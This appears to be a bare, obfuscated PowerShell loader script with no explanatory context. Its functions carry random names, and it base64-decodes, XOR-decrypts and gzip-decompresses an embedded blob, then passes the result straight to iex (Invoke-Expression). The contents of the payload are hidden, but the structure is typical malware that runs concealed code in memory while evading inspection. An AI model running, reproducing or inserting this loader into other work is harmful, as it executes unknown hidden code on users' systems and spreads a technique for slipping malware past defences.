$a1w0e2pi3zm5x84 = [System.Text.Encoding]::ascii
function qscai0lm5joh46ykv1972weug83  {param($qx72bgfldck4pan )
  $efqlbgomj7s2kch = [System.Convert]::FromBase64String($qx72bgfldck4pan)
  $84e3svdnzw6qxym= $a1w0e2pi3zm5x84.GetBytes("38zqmi6js5hb")
    $93umh2dqjnc68ag = $efqlbgomj7s2kch
    $c8d2yhvu6l1m45s = $(for ($xoqbln7mwt431ga = 0; $xoqbln7mwt431ga -lt $93umh2dqjnc68ag.length; ) {
        for ($qzgcp0edwf7mlhb = 0; $qzgcp0edwf7mlhb -lt $84e3svdnzw6qxym.length; $qzgcp0edwf7mlhb++) {
            $93umh2dqjnc68ag[$xoqbln7mwt431ga] -bxor $84e3svdnzw6qxym[$qzgcp0edwf7mlhb]
            $xoqbln7mwt431ga++
            if ($xoqbln7mwt431ga -ge $93umh2dqjnc68ag.Length) {
                $qzgcp0edwf7mlhb = $84e3svdnzw6qxym.length
            }
        }
    })
	$naoycdq4xzgp9tb = New-Object System.IO.MemoryStream( , $c8d2yhvu6l1m45s )

	    $zh8jflm7ye3rws2 = New-Object System.IO.MemoryStream
        $6w10ncmufp98h73 = New-Object System.IO.Compression.GzipStream $naoycdq4xzgp9tb, ([IO.Compression.CompressionMode]::Decompress)
	    $6w10ncmufp98h73.CopyTo( $zh8jflm7ye3rws2 )
        $6w10ncmufp98h73.Close()
		$naoycdq4xzgp9tb.Close()
		[byte[]] $axfk29uoc43m6vh = $zh8jflm7ye3rws2.ToArray()
 $jkztnd1cf0p54gv=$axfk29uoc43m6vh
    return $jkztnd1cf0p54gv
}
[byte[]]$pfa5c0oew2k1szu=qscai0lm5joh46ykv1972weug83 $sjixyo3bnaue5qw
[System.Text.Encoding]::ascii.GetString((qscai0lm5joh46ykv1972weug83 "LLNycW1pNmp3NeU3XleYSX2XSiKKOj6mmtmiNYwM7bclyGgO6YotCxAogRG0Y0PxC7FbwO6KJgL8yhbxJBD+jL0xvIiCzfEFrSFBOyDo10y/o/xRJwOu7L+tf3oJYAJqrTBxbQcc1ETxnK+h6mGm77aXMT58vJzb4BDGm1yfJLWw3Xovre7LVcxYEEEabaSEPV2kgpRQuAc5uANAyFMzEyBknokJy/xzhqkruT3Bvd5hIoEGsmxgDh+/yDgeoQyQYy1QnmSQEm8rgcW9s4tfYH9VmG58zlBElOWo1Oe3HnmvWVG0DE/ooQJSvXPAelcD3MVjbiz+tj5Xq+fZM2ytLUMptH8seWsUJZ7IqgSMlPBk3aDINMry/Hx50COMN12yrVx/m4+shUngDcEZJT6ExSnEbBmnh/JZh5ItwhTpyUEuEz3c/HDl3+2hIBYhMBXMM26MRvbu3RPAKQGAols3H55FuHKUdOYnmhwFyQqaAEdMAhGV3fQBpBEGYQTEoZXSzC4+V++Edv+pc1FenHtsOnFtfIfGbbB9NrQo2malKp0hdpLuYL5OvDEceqnzwo9kWRp36MYHHfEM2QWFlMGGfYuWF0rZCmpgPKlEkWT6nr81VZd/jnYWbuaOzKU+No1I5+VyOlX5XPfD0FHsET8xjc7hmUDGRYYym0eUhTaHWW3nBaESexY1I/KuxM4KV/h3CmkQ8+kVfx55P8p+XVT3nxKVVy4CHrd4YzELA8EEsswZibgq/q4pcHacOnumFn8dh3U0o5vVI9VXUFN6UGaQfrn2Fi3LIUzycsIH5+7zMzriy19sIUr+8JkECzsFg1vPQP0X1iFmiNuQ3YsXd6j0kvXt5Qr+4dpBtUe7ZHkvtK5CIbnakTnzgnicdMM+H8Od4fB/dgV1XU92g436TJn4qf/igzyjyegoFux8cc0U32D06fCrbyJxrFaEegFmSbaIky5nMt8S24cUlRZ/P+HSFPfKMYG4QNcZRu1h69rASxeQyJsfw1ijht6Qno3qgr6BsAEG/dK2ToPs46TYgMKc2fqz69GNxTIfiPfvK6k6FAjsMWkAF+39MYY3xmId0J3MMfh4Wx1umvoZmEpIs5w3H83BjaifD4hCsBkhg1S4ie8HYZYuAXlpOClnUKpPtcrCXKwPq1JImGcpovlksVhzNIZgGWNyx/4gPMVAPVubNSP4ZhAzq8Z9I5DK7jl0NWg="))|iex;